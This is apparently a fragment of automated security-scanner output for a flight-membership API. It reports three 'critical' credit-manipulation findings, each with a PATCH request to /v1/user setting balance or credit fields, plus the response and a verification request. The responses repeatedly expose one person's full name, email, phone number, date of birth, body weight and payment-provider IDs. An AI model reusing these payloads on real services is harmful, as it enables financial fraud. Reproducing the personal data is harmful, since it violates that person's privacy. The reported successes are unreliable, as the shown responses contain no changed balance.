            "successfulReferralCount": 0,
            "lastFlightPurchase": null,
            "eulaVersion": null,
            "isEulaAccepted": false,
            "hasStripePaymentDetails": false,
            "stripeCustomerId": "cus_PlS5D89fzdDYgF",
            "stripeSubscriptionId": null,
            "stripeSubscriptionPaymentIntentId": null,
            "stripeFlightPurchasePaymentIntentId": null,
            "subscriptionStartDate": 1760700980000,
            "subscriptionRenewalDate": 1830297600000,
            "lastActivityAt": 1762307406434,
            "referralKey": "nBBMuS",
            "smsOptIn": true,
            "emailOptIn": true,
            "trackingOptIn": false,
            "isFlightNotificationEnabled": true,
            "isAllFlightsNotificationEnabled": true,
            "androidAppVersion": "1.1.40",
            "androidBuildNumber": 183,
            "iosAppVersion": "1.1.40",
            "iosBuildNumber": 219,
            "abandonedRegReminderSent": false,
            "license": {
              "createdAt": 1760700980000,
              "updatedAt": 1760746044256,
              "id": 3050,
              "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
              "expiresAt": 1830297600000,
              "isAssigned": true,
              "stripeSubscriptionId": null,
              "preferredStripeCreationDate": 1798761600000,
              "membershipTier": {
                "id": 2,
                "name": "cabin+",
                "priorityLevel": 2
              },
              "account": null,
              "user": 20254,
              "licenseRefund": null
            },
            "account": null,
            "subscriptionStatus": 3,
            "waitlistUpgrades": [
              {
                "createdAt": 1711138021682,
                "updatedAt": 1713541686134,
                "id": 456,
                "costToUse": 149500,
                "customAmount": null,
                "stripePaymentIntentId": null,
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 1,
                  "name": "base",
                  "priorityLevel": 1,
                  "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1711138021682,
                "updatedAt": 1746829193471,
                "id": 896,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": "in_1RMzGkBkrWmvysmuux7aAe55",
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 2,
                  "name": "base_free",
                  "priorityLevel": 1,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1742705161901,
                "updatedAt": 1742705161902,
                "id": 5484,
                "costToUse": 149500,
                "customAmount": null,
                "stripePaymentIntentId": null,
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 1,
                  "name": "base",
                  "priorityLevel": 1,
                  "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1746886000226,
                "updatedAt": 1746886000226,
                "id": 5978,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": null,
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 2,
                  "name": "base_free",
                  "priorityLevel": 1,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1761856740189,
                "updatedAt": 1761864095757,
                "id": 7756,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
                "usedOn": 1761864095757,
                "priorityUpgradeTier": {
                  "id": 4,
                  "name": "cabin+_free",
                  "priorityLevel": 2,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              }
            ],
            "termsStatus": {
              "TermsAndConditions": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451030
              },
              "PrivacyPolicy": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451047
              }
            }
          }
        }
      },
      "discovered_at": "2025-11-05T17:23:21.596699"
    },
    {
      "category": "Credit Manipulation",
      "severity": "CRITICAL",
      "title": "Credit/Balance Manipulation Possible: Add account balance",
      "description": "System accepts credit manipulation via /v1/user",
      "proof": {
        "request": {
          "endpoint": "/v1/user",
          "method": "PATCH",
          "status": 200,
          "description": "Add account balance",
          "params": null,
          "data": {
            "balance": 10000,
            "accountBalance": 10000
          },
          "response": {
            "sweepstakesEntries": [],
            "createdAt": 1710825847458,
            "updatedAt": 1762363401720,
            "id": 20254,
            "phoneNumber": "+13035234453",
            "email": "sameer.s.chopra@gmail.com",
            "confirmedEmail": "sameer.s.chopra@gmail.com",
            "priorityScore": 1931577847,
            "firstName": "Sameer",
            "middleName": "",
            "lastName": "Chopra",
            "dateOfBirth": "1991-08-14",
            "weight": 140,
            "gender": "Male",
            "isCarbonOffsetEnrolled": true,
            "successfulReferralCount": 0,
            "lastFlightPurchase": null,
            "eulaVersion": null,
            "isEulaAccepted": false,
            "hasStripePaymentDetails": false,
            "stripeCustomerId": "cus_PlS5D89fzdDYgF",
            "stripeSubscriptionId": null,
            "stripeSubscriptionPaymentIntentId": null,
            "stripeFlightPurchasePaymentIntentId": null,
            "subscriptionStartDate": 1760700980000,
            "subscriptionRenewalDate": 1830297600000,
            "lastActivityAt": 1762307406434,
            "referralKey": "nBBMuS",
            "smsOptIn": true,
            "emailOptIn": true,
            "trackingOptIn": false,
            "isFlightNotificationEnabled": true,
            "isAllFlightsNotificationEnabled": true,
            "androidAppVersion": "1.1.40",
            "androidBuildNumber": 183,
            "iosAppVersion": "1.1.40",
            "iosBuildNumber": 219,
            "abandonedRegReminderSent": false,
            "license": {
              "createdAt": 1760700980000,
              "updatedAt": 1760746044256,
              "id": 3050,
              "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
              "expiresAt": 1830297600000,
              "isAssigned": true,
              "stripeSubscriptionId": null,
              "preferredStripeCreationDate": 1798761600000,
              "membershipTier": {
                "id": 2,
                "name": "cabin+",
                "priorityLevel": 2
              },
              "account": null,
              "user": 20254,
              "licenseRefund": null
            },
            "account": null,
            "subscriptionStatus": 3,
            "waitlistUpgrades": [
              {
                "createdAt": 1761856740189,
                "updatedAt": 1761864095757,
                "id": 7756,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
                "usedOn": 1761864095757,
                "priorityUpgradeTier": {
                  "id": 4,
                  "name": "cabin+_free",
                  "priorityLevel": 2,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              }
            ],
            "termsStatus": {
              "TermsAndConditions": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451030
              },
              "PrivacyPolicy": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451047
              }
            }
          }
        },
        "verification": {
          "endpoint": "/v1/user",
          "method": "GET",
          "status": 200,
          "description": "Verify user",
          "params": null,
          "data": null,
          "response": {
            "sweepstakesEntries": [],
            "createdAt": 1710825847458,
            "updatedAt": 1762363401720,
            "id": 20254,
            "phoneNumber": "+13035234453",
            "email": "sameer.s.chopra@gmail.com",
            "confirmedEmail": "sameer.s.chopra@gmail.com",
            "priorityScore": 1931577847,
            "firstName": "Sameer",
            "middleName": "",
            "lastName": "Chopra",
            "dateOfBirth": "1991-08-14",
            "weight": 140,
            "gender": "Male",
            "isCarbonOffsetEnrolled": true,
            "successfulReferralCount": 0,
            "lastFlightPurchase": null,
            "eulaVersion": null,
            "isEulaAccepted": false,
            "hasStripePaymentDetails": false,
            "stripeCustomerId": "cus_PlS5D89fzdDYgF",
            "stripeSubscriptionId": null,
            "stripeSubscriptionPaymentIntentId": null,
            "stripeFlightPurchasePaymentIntentId": null,
            "subscriptionStartDate": 1760700980000,
            "subscriptionRenewalDate": 1830297600000,
            "lastActivityAt": 1762307406434,
            "referralKey": "nBBMuS",
            "smsOptIn": true,
            "emailOptIn": true,
            "trackingOptIn": false,
            "isFlightNotificationEnabled": true,
            "isAllFlightsNotificationEnabled": true,
            "androidAppVersion": "1.1.40",
            "androidBuildNumber": 183,
            "iosAppVersion": "1.1.40",
            "iosBuildNumber": 219,
            "abandonedRegReminderSent": false,
            "license": {
              "createdAt": 1760700980000,
              "updatedAt": 1760746044256,
              "id": 3050,
              "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
              "expiresAt": 1830297600000,
              "isAssigned": true,
              "stripeSubscriptionId": null,
              "preferredStripeCreationDate": 1798761600000,
              "membershipTier": {
                "id": 2,
                "name": "cabin+",
                "priorityLevel": 2
              },
              "account": null,
              "user": 20254,
              "licenseRefund": null
            },
            "account": null,
            "subscriptionStatus": 3,
            "waitlistUpgrades": [
              {
                "createdAt": 1711138021682,
                "updatedAt": 1713541686134,
                "id": 456,
                "costToUse": 149500,
                "customAmount": null,
                "stripePaymentIntentId": null,
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 1,
                  "name": "base",
                  "priorityLevel": 1,
                  "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1711138021682,
                "updatedAt": 1746829193471,
                "id": 896,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": "in_1RMzGkBkrWmvysmuux7aAe55",
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 2,
                  "name": "base_free",
                  "priorityLevel": 1,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1742705161901,
                "updatedAt": 1742705161902,
                "id": 5484,
                "costToUse": 149500,
                "customAmount": null,
                "stripePaymentIntentId": null,
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 1,
                  "name": "base",
                  "priorityLevel": 1,
                  "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1746886000226,
                "updatedAt": 1746886000226,
                "id": 5978,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": null,
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 2,
                  "name": "base_free",
                  "priorityLevel": 1,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1761856740189,
                "updatedAt": 1761864095757,
                "id": 7756,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
                "usedOn": 1761864095757,
                "priorityUpgradeTier": {
                  "id": 4,
                  "name": "cabin+_free",
                  "priorityLevel": 2,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              }
            ],
            "termsStatus": {
              "TermsAndConditions": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451030
              },
              "PrivacyPolicy": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451047
              }
            }
          }
        }
      },
      "discovered_at": "2025-11-05T17:23:22.091762"
    },
    {
      "category": "Credit Manipulation",
      "severity": "CRITICAL",
      "title": "Credit/Balance Manipulation Possible: Add Duffel credits",
      "description": "System accepts credit manipulation via /v1/user",
      "proof": {
        "request": {
          "endpoint": "/v1/user",
          "method": "PATCH",
          "status": 200,
          "description": "Add Duffel credits",
          "params": null,
          "data": {
            "duffel_credits": 9999
          },
          "response": {
            "sweepstakesEntries": [],
            "createdAt": 1710825847458,
            "updatedAt": 1762363402589,
            "id": 20254,
            "phoneNumber": "+13035234453",
            "email": "sameer.s.chopra@gmail.com",
            "confirmedEmail": "sameer.s.chopra@gmail.com",
            "priorityScore": 1931577847,
            "firstName": "Sameer",
            "middleName": "",
            "lastName": "Chopra",
            "dateOfBirth": "1991-08-14",
            "weight": 140,
            "gender": "Male",
            "isCarbonOffsetEnrolled": true,
            "successfulReferralCount": 0,
            "lastFlightPurchase": null,
            "eulaVersion": null,
            "isEulaAccepted": false,
            "hasStripePaymentDetails": false,
            "stripeCustomerId": "cus_PlS5D89fzdDYgF",
            "stripeSubscriptionId": null,
            "stripeSubscriptionPaymentIntentId": null,
            "stripeFlightPurchasePaymentIntentId": null,
            "subscriptionStartDate": 1760700980000,
            "subscriptionRenewalDate": 1830297600000,
            "lastActivityAt": 1762307406434,
            "referralKey": "nBBMuS",
            "smsOptIn": true,
            "emailOptIn": true,
            "trackingOptIn": false,
            "isFlightNotificationEnabled": true,
            "isAllFlightsNotificationEnabled": true,
            "androidAppVersion": "1.1.40",
            "androidBuildNumber": 183,
            "iosAppVersion": "1.1.40",
            "iosBuildNumber": 219,
            "abandonedRegReminderSent": false,
            "license": {
              "createdAt": 1760700980000,
              "updatedAt": 1760746044256,
              "id": 3050,
              "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
              "expiresAt": 1830297600000,
              "isAssigned": true,
              "stripeSubscriptionId": null,
              "preferredStripeCreationDate": 1798761600000,
              "membershipTier": {
                "id": 2,
                "name": "cabin+",
                "priorityLevel": 2
              },
              "account": null,
              "user": 20254,
              "licenseRefund": null
            },
            "account": null,
            "subscriptionStatus": 3,
            "waitlistUpgrades": [
              {
                "createdAt": 1761856740189,
                "updatedAt": 1761864095757,
                "id": 7756,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
                "usedOn": 1761864095757,
                "priorityUpgradeTier": {
                  "id": 4,
                  "name": "cabin+_free",
                  "priorityLevel": 2,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              }
            ],
            "termsStatus": {
              "TermsAndConditions": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451030
              },
              "PrivacyPolicy": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451047
              }
            }
          }
        },
        "verification": {
          "endpoint": "/v1/user",
          "method": "GET",
          "status": 200,
          "description": "Verify user",
          "params": null,
          "data": null,
          "response": {
            "sweepstakesEntries": [],
            "createdAt": 1710825847458,
            "updatedAt": 1762363402589,
            "id": 20254,
            "phoneNumber": "+13035234453",
            "email": "sameer.s.chopra@gmail.com",
            "confirmedEmail": "sameer.s.chopra@gmail.com",
            "priorityScore": 1931577847,
            "firstName": "Sameer",
            "middleName": "",
            "lastName": "Chopra",
            "dateOfBirth": "1991-08-14",
            "weight": 140,
            "gender": "Male",
            "isCarbonOffsetEnrolled": true,
            "successfulReferralCount": 0,
            "lastFlightPurchase": null,
            "eulaVersion": null,
            "isEulaAccepted": false,
            "hasStripePaymentDetails": false,
            "stripeCustomerId": "cus_PlS5D89fzdDYgF",
            "stripeSubscriptionId": null,
            "stripeSubscriptionPaymentIntentId": null,
            "stripeFlightPurchasePaymentIntentId": null,
            "subscriptionStartDate": 1760700980000,
            "subscriptionRenewalDate": 1830297600000,
            "lastActivityAt": 1762307406434,
            "referralKey": "nBBMuS",
            "smsOptIn": true,
            "emailOptIn": true,
            "trackingOptIn": false,
            "isFlightNotificationEnabled": true,
            "isAllFlightsNotificationEnabled": true,
            "androidAppVersion": "1.1.40",
            "androidBuildNumber": 183,
            "iosAppVersion": "1.1.40",
            "iosBuildNumber": 219,
            "abandonedRegReminderSent": false,
            "license": {
              "createdAt": 1760700980000,
              "updatedAt": 1760746044256,
              "id": 3050,
              "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
              "expiresAt": 1830297600000,
              "isAssigned": true,
              "stripeSubscriptionId": null,
              "preferredStripeCreationDate": 1798761600000,
              "membershipTier": {
                "id": 2,
                "name": "cabin+",
                "priorityLevel": 2
              },
              "account": null,
              "user": 20254,
              "licenseRefund": null
            },
            "account": null,
            "subscriptionStatus": 3,
            "waitlistUpgrades": [
              {
                "createdAt": 1711138021682,
                "updatedAt": 1713541686134,
                "id": 456,
                "costToUse": 149500,
                "customAmount": null,
                "stripePaymentIntentId": null,
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 1,
                  "name": "base",
                  "priorityLevel": 1,
                  "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1711138021682,
                "updatedAt": 1746829193471,
                "id": 896,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": "in_1RMzGkBkrWmvysmuux7aAe55",
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 2,
                  "name": "base_free",
                  "priorityLevel": 1,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1742705161901,
                "updatedAt": 1742705161902,
                "id": 5484,
                "costToUse": 149500,
                "customAmount": null,
                "stripePaymentIntentId": null,
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 1,
                  "name": "base",
                  "priorityLevel": 1,
                  "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1746886000226,
                "updatedAt": 1746886000226,
                "id": 5978,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": null,
                "usedOn": null,
                "priorityUpgradeTier": {
                  "id": 2,
                  "name": "base_free",
                  "priorityLevel": 1,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              },
              {
                "createdAt": 1761856740189,
                "updatedAt": 1761864095757,
                "id": 7756,
                "costToUse": 0,
                "customAmount": null,
                "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
                "usedOn": 1761864095757,
                "priorityUpgradeTier": {
                  "id": 4,
                  "name": "cabin+_free",
                  "priorityLevel": 2,
                  "stripePriceId": null
                },
                "user": 20254,
                "expiresOn": -1
              }
            ],
            "termsStatus": {
              "TermsAndConditions": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451030
              },
              "PrivacyPolicy": {
                "requiresAcceptance": false,
                "currentVersion": "1.1",
                "lastAcceptedVersion": "1.1",
                "lastAcceptedDate": 1756848451047
              }
            }
          }
        }
      },
      "discovered_at": "2025-11-05T17:23:22.955120"
    }
  ],
  "summary": {
    "total_tests": 63,
    "vulnerabilities_found": 3,
    "critical": 3,
    "high": 0,
    "medium": 0
  }
}